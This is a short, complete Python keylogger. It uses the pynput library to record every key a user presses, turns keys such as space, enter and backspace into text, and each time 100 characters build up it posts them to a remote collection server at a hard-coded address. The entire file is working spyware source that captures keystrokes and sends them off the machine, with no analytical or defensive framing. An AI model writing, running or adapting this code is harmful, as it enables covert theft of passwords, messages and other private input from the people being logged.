from pynput.keyboard import Listener
import requests

keystrokes = ""

SERVER_URL = "http://192.168.1.102:5000/log"
KEYSTROKE_LIMIT = 100 


def send_keystrokes_to_server(content):
    try:
        response = requests.post(SERVER_URL, data={"keystrokes": content})
        if response.status_code == 200:
            print("[+] Keystrokes sent successfully")
        else:
            print(f"[!] Server responded with status: {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to send keystrokes: {e}")

def log_happykey(key):
    global keystrokes
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key in ['Key.shift', 'Key.shift_r', 'Key.shift_l', 'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r']:
        key = ''  
    elif key == 'Key.backspace':
        key = '<'

    keystrokes += key

    if len(keystrokes) >= KEYSTROKE_LIMIT:
        send_keystrokes_to_server(keystrokes)
        keystrokes = "" 


print("[*] Keylogger started. Press Ctrl+C to stop.")
with Listener(on_press=log_happykey) as l:
    l.join()
